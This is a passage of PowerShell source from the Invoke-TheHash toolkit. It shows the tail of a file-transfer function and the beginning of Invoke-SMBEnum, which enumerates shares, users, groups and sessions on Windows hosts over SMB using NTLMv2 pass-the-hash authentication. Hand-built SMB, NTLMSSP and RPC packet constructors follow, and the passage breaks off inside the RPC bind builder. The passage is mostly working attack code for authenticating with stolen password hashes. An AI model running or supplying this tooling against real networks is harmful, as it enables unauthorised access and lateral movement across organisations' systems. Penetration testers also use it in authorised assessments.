    {
        Write-Output "[-] $($_.Exception.Message)"
    }
    finally
    {  

        if($file_write.Handle)
        {
            $file_write.Close()
        }

        if($source_file_stream.Handle)
        {
            $source_file_binary_reader.Close()
            $source_file_stream.Close()
        }

        if($inveigh_session -and $Inveigh)
        {
            $inveigh.session_lock_table[$session] = 'open'
            $inveigh.session_message_ID_table[$session] = $message_ID
            $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
        }

        if(!$inveigh_session -or $Logoff)
        {
            $client.Close()
            $client_stream.Close()
        }

    }

}

    if(!$Modify -or $Action -eq 'Put')
    {
        Write-Output $output_message
    }
    elseif($output_message)
    {
        Write-Verbose $output_message
    }

}





function Invoke-SMBEnum
{
<#
.SYNOPSIS
Invoke-SMBEnum performs enumeration tasks over SMB with NTLMv2 pass the hash authentication. Invoke-SMBEnum
supports SMB2.1 with and without SMB signing.

Author: Kevin Robertson (@kevin_robertson)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Action
(All,Group,NetSession,Share,User) Default = Share: Enumeration action to perform.

.PARAMETER Group
Default = Administrators: Group to enumerate.

.PARAMETER Sleep
Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target. Note, only the signing check works with SMB1.

.PARAMETER TargetShow
(Switch) Outputs the target as part of the results for single action types.

.EXAMPLE
List shares.
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
List NetSessions.
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action NetSession

.EXAMPLE
List local users using an authenticated Inveigh-Relay session.
Invoke-SMBEnum -Session 1 -Action User

.EXAMPLE
Check if SMB signing is required.
Invoke-SMBEnum -Target 192.168.100.20 -SigningCheck

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Action = "All",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Group = "Administrators",
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(Mandatory=$false)][Switch]$TargetShow,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

if($PsCmdlet.ParameterSetName -ne 'Session' -and !$Target)
{
    Write-Output "[-] Target is required when not using -Session"
    throw
}

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

    [Byte[]]$buffer_bytes = ,0x00 * $Buffer

    $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $SMB2QueryInfoRequest.Add("InfoType",$InfoType)
    $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)
    $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)
    $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("FileID",$FileID)

    if($Buffer -gt 0)
    {
        $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)
    }

    return $SMB2QueryInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$write_length)
    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

function New-PacketSMB2IoctlRequest
{
    param([Byte[]]$Function,[Byte[]]$FileName,[Int]$Length,[Int]$OutSize)

    [Byte[]]$indata_length = [System.BitConverter]::GetBytes($Length + 24)
    [Byte[]]$out_size = [System.BitConverter]::GetBytes($OutSize)

    $SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2IoctlRequest.Add("Function",$Function)
    $SMB2IoctlRequest.Add("GUIDHandle",$FileName)
    $SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("InData_Length",$indata_length)
    $SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("MaxIoctlOutSize",$out_size)
    $SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    if($out_size -eq 40)
    {
        $SMB2IoctlRequest.Add("InData_Capabilities",[Byte[]](0x7f,0x00,0x00,0x00))
        $SMB2IoctlRequest.Add("InData_ClientGUID",[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        $SMB2IoctlRequest.Add("InData_SecurityMode",[Byte[]](0x01))
        $SMB2IoctlRequest.Add("InData_Unknown",[Byte[]](0x00))
        $SMB2IoctlRequest.Add("InData_DialectCount",[Byte[]](0x02,0x00))
        $SMB2IoctlRequest.Add("InData_Dialect",[Byte[]](0x02,0x02))
        $SMB2IoctlRequest.Add("InData_Dialect2",[Byte[]](0x10,0x02))
    }

    return $SMB2IoctlRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)

    [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)

    $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $RPCBind.Add("Version",[Byte[]](0x05))
    $RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $RPCBind.Add("PacketType",[Byte[]](0x0b))
    $RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $RPCBind.Add("FragLength",$FragLength)
    $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $RPCBind.Add("CallID",$call_ID)
    $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $RPCBind.Add("NumCtxItems",$NumCtxItems)
    $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $RPCBind.Add("ContextID",$ContextID)
    $RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $RPCBind.Add("Unknown2",[Byte[]](0x00))
    $RPCBind.Add("Interface",$UUID)
    $RPCBind.Add("InterfaceVer",$UUIDVersion)
    $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($NumCtxItems[0] -eq 2)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($NumCtxItems[0] -eq 3)
    {
        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $RPCBind.Add("Unknown3",[Byte[]](0x00))
        $RPCBind.Add("Interface2",$UUID)
        $RPCBind.Add("InterfaceVer2",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $RPCBind.Add("Unknown4",[Byte[]](0x00))
        $RPCBind.Add("Interface3",$UUID)
        $RPCBind.Add("InterfaceVer3",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
